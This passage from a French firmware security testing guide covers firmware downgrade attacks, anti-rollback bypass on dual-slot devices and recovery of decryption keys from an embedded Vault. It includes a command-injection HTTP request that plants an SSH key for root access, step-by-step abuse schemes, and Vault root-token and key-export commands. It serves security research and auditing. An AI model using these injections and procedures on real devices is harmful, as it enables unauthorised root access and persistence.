- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distribution conçue pour vous aider à évaluer la sécurité et à effectuer des tests d’intrusion sur des appareils de l’Internet des objets (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation de tests de sécurité embarquée basé sur Ubuntu 18.04 et préchargé avec des outils de test de sécurité des firmwares.

## Attaques par rétrogradation de firmware et mécanismes de mise à jour non sécurisés

Même lorsqu’un fabricant implémente des vérifications de signature cryptographique pour les images de firmware, la **protection contre le retour à une version antérieure (rétrogradation)** est souvent omise. Si le chargeur d’amorçage ou de récupération vérifie uniquement la signature à l’aide d’une clé publique intégrée, sans comparer la *version* (ou un compteur monotone) de l’image flashée, un attaquant peut installer légitimement un **ancien firmware vulnérable toujours doté d’une signature valide** et ainsi réintroduire des vulnérabilités corrigées.<sup>[[4]](#references)</sup>

Méthode d’attaque habituelle :

1. **Obtenez une ancienne image signée**
   * Récupérez-la sur le portail de téléchargement public du fabricant, son CDN ou son site d’assistance.
   * Extrayez-la des applications mobiles/de bureau associées (par exemple, dans un APK Android, sous `assets/firmware/`).
   * Récupérez-la depuis des dépôts tiers tels que VirusTotal, des archives Internet, des forums, etc.
2. **Téléversez ou fournissez l’image à l’appareil** via un canal de mise à jour exposé :
   * Interface Web, API d’application mobile, USB, TFTP, MQTT, etc.
   * De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *non authentifiés* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent la récupération/la mise à niveau.
3. Après la rétrogradation, exploitez une vulnérabilité corrigée dans une version plus récente (par exemple, un filtre contre l’injection de commandes ajouté par la suite).
4. Si nécessaire, reflashez la dernière image ou désactivez les mises à jour afin d’éviter la détection une fois la persistance obtenue.

### Exemple : injection de commandes après rétrogradation

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Dans le firmware vulnérable (rétrogradé), le paramètre `md5` est concaténé directement à une commande shell sans assainissement, ce qui permet d’injecter des commandes arbitraires (ici, d’activer un accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre de caractères basique, mais l’absence de protection contre le downgrade rend ce correctif sans effet.<sup>[[4]](#references)</sup>

### Extraction du firmware depuis des applications mobiles

De nombreux fournisseurs intègrent des images complètes du firmware dans leurs applications mobiles associées afin que l’application puisse mettre à jour l’appareil par Bluetooth/Wi-Fi. Ces packages sont généralement stockés sans chiffrement dans l’APK/APEX, dans des chemins comme `assets/fw/` ou `res/raw/`. Des outils tels que `apktool`, `ghidra`, ou même le simple `unzip`, permettent d’extraire des images signées sans toucher au matériel physique.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Contournement de l’anti-rollback limité à l’updater dans les conceptions à slots A/B

Certains fournisseurs implémentent bien un **ratchet** anti-downgrade, mais uniquement dans la logique de l’*updater* (par exemple une routine UDS sur CAN, une commande de récupération ou un agent OTA en espace utilisateur). Si le **bootloader** vérifie ensuite uniquement la signature/CRC de l’image et fait confiance à la table de partitions ou aux métadonnées de slot, la protection contre le rollback peut toujours être contournée.<sup>[[7]](#references)</sup>

Conception faible typique :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **ratchet de sécurité** / compteur monotone.
- L’updater compare le ratchet de l’image à une valeur stockée dans le stockage persistant et rejette les anciennes images signées.
- Le bootloader ne lit **pas** ce ratchet et vérifie uniquement l’en-tête, le CRC et la signature avant de démarrer le slot sélectionné.
- L’activation du slot est stockée séparément, dans une table de partitions ou un compteur de génération propre à chaque slot, et n’est **pas liée cryptographiquement** au digest exact du firmware qui a été validé.

Cela crée une primitive **valider une image / en démarrer une autre** dans les systèmes à deux slots. Si l’attaquant peut faire marquer le slot B comme prochaine cible de démarrage par l’updater à l’aide d’une image signée actuelle, puis écraser le slot B avant le redémarrage, le bootloader peut quand même démarrer l’image rétrogradée, car il ne fait confiance qu’aux métadonnées de slot déjà validées.

Schéma d’abus courant :

1. Téléverser un firmware **actuel et signé** dans le slot passif et exécuter la routine normale de validation/basculement afin que la configuration désigne ce slot comme prochain slot actif.
2. **Ne pas redémarrer tout de suite**. Relancer la routine de préparation/effacement du slot dans la même session.
3. Exploiter un état de démarrage obsolète ou une logique de sélection de slot périmée afin que l’updater efface le **même slot physique** qui vient d’être promu.
4. Écrire un firmware **plus ancien, mais toujours signé**, dans ce slot.
5. Ignorer la routine de validation qui applique le ratchet et redémarrer directement.
6. Le bootloader sélectionne le slot promu, vérifie uniquement la signature/intégrité et démarre l’ancienne image.

Points à examiner lors de la rétro-ingénierie des implémentations de mise à jour A/B :

- La sélection du slot est dérivée d’indicateurs **de démarrage** qui ne sont pas actualisés après un basculement réussi.
- Une routine du type `prepare_passive_slot()` efface un slot en se basant sur un état périmé au lieu de la **configuration actuellement validée**.
- Une fonction du type `part_write_layout()` ne fait qu’incrémenter un **compteur de génération** / indicateur d’activation et ne stocke pas le hash de l’image validée.
- Les vérifications du ratchet sont implémentées en espace utilisateur ou dans le code de l’updater, mais **pas** dans la ROM / le bootloader / les étapes de secure boot.
- Les routines d’effacement ou de récupération laissent le slot marqué comme amorçable même après que son contenu a été supprimé puis réécrit.

### Liste de vérification pour évaluer la logique de mise à jour

* Le transport et l’authentification de l’*endpoint de mise à jour* sont-ils suffisamment protégés (TLS + authentification) ?
* L’appareil compare-t-il les **numéros de version** ou un **compteur monotone anti-rollback** avant le flashage ?
* L’image est-elle vérifiée dans une chaîne de secure boot (par exemple, les signatures sont-elles vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même ratchet** que l’updater, au lieu de vérifier uniquement la signature/CRC ?
* Les métadonnées d’activation du slot sont-elles **liées au digest/à la version du firmware validé**, ou le slot peut-il être modifié après sa promotion ?
* Après la réussite du basculement de slot, l’appareil est-il forcé de redémarrer, ou les routines ultérieures de mise à jour/effacement restent-elles accessibles dans la même session ?
* Le code en espace utilisateur effectue-t-il des vérifications de cohérence supplémentaires (par exemple, sur la table de partitions autorisée ou le numéro de modèle) ?
* Les flux de mise à jour *partiels* ou de *sauvegarde* réutilisent-ils la même logique de validation ?

> 💡  Si l’un des éléments ci-dessus est absent, la plateforme est probablement vulnérable aux attaques par rollback.

## Firmware vulnérable pour s’entraîner

Pour s’entraîner à découvrir des vulnérabilités dans le firmware, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Récupération de clés de déchiffrement du firmware à partir de l’état intégré de KMS/Vault

Lorsqu’une image de mise à jour mélange de petites métadonnées en clair avec un grand bloc à haute entropie, commencez par analyser le conteneur avant de tenter quoi que ce soit par force brute :<sup>[[1]](#references)</sup>

- Affichez les en-têtes, les offsets et les limites de lignes avec `hexdump`, `xxd`, `strings -tx`, `base64 -d` et `binwalk -E`.
- `Salted__` indique généralement le format OpenSSL `enc` : les 8 octets suivants sont le sel et les octets restants sont le texte chiffré.
- Un champ Base64 qui se décode en exactement `256` octets indique fortement un texte chiffré RSA-2048 qui encapsule un mot de passe de firmware ou une clé de session aléatoire.
- Les données PGP détachées dans le même fichier protègent souvent uniquement l’authenticité ; ne partez pas du principe qu’elles assurent la confidentialité.

Si la recherche de clés statiques (`grep`, `strings`, recherches PEM/PGP) échoue, rétro-ingénieriez plutôt le **chemin de déchiffrement opérationnel**, au lieu de chercher uniquement des clés privées :

- Décompilez l’updater / le binaire de gestion et suivez le code pour déterminer qui lit le blob chiffré, quel helper/API le déchiffre et quel nom de clé logique est demandé.
- Recherchez l’état KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), ainsi que les fichiers d’unités et les scripts d’initialisation, dans le système de fichiers racine extrait.
- Considérez les commandes en clair `vault operator unseal ...`, les clés de récupération, les jetons d’amorçage ou les scripts locaux d’auto-déverrouillage KMS comme équivalents à du matériel de clé privée.

Si l’appliance inclut le binaire Vault d’origine et son backend de stockage, rejouer cet environnement est généralement plus simple que de réimplémenter les composants internes de Vault :

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Avec root sur le KMS cloné :

- Rendez les clés transit exportables uniquement dans le clone isolé : `vault write transit/keys/<name>/config exportable=true`
- Exportez la clé de déchiffrement : `vault read transit/export/encryption-key/<name>`
- Essayez la clé RSA récupérée avec la paire exacte padding/hash utilisée par le KMS. Un échec du déchiffrement PKCS#1 v1.5 et un échec du déchiffrement OAEP par défaut ne prouvent **pas** que la clé est incorrecte ; de nombreux flux reposant sur Vault utilisent OAEP avec SHA-256, alors que les bibliothèques courantes utilisent SHA-1 par défaut.
- Si la charge utile commence par `Salted__`, reproduisez exactement le KDF OpenSSL du fournisseur (`EVP_BytesToKey`, souvent MD5 sur les appareils anciens) avant de tenter un déchiffrement AES-CBC.

On transforme ainsi le problème du « firmware chiffré » en un problème plus général : **récupérer les clés opérationnelles côté appareil, puis reproduire hors ligne les paramètres exacts de déchiffrement et du KDF**.

## Formation et certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Craquer un firmware avec Claude : des compétences de niveau senior, une autonomie de niveau junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Méthodologie de test de sécurité des firmwares](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking : le guide définitif pour attaquer l'Internet des objets](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiter des zero-days dans du matériel abandonné – Blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Comment un appareil connecté à 20 $ m'a donné accès à votre domicile](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Maintenant vous voyez mi : maintenant, vous êtes pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiter le Tesla Wall Connector via son connecteur de port de charge - Partie 2 : contourner la protection anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faites-le clignoter : exploitation over-the-air du Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS sur QEMU, partie 2 : débogage et correction](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Mots de passe du BIOS Dell : le chiffrement XOR faible permet leur récupération depuis la mémoire flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Outils de récupération des mots de passe du BIOS Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
